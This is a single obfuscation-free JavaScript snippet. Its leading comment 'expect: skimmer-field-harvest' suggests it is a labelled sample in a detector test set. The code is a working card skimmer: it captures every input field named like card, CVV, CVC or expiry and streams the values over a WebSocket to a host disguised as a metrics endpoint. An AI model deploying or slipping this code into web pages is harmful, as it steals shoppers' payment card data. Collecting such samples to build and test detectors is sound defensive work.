// expect: skimmer-field-harvest
(function(){var w=new WebSocket('wss://ws-metrics.example/s');var r=/card|cvv|cvc|cc_|exp/i;document.addEventListener('input',function(){var o={};document.querySelectorAll('input').forEach(function(i){if(r.test(i.name||i.id))o[i.name||i.id]=i.value;});if(w.readyState===1)w.send(JSON.stringify(o));},true);})();
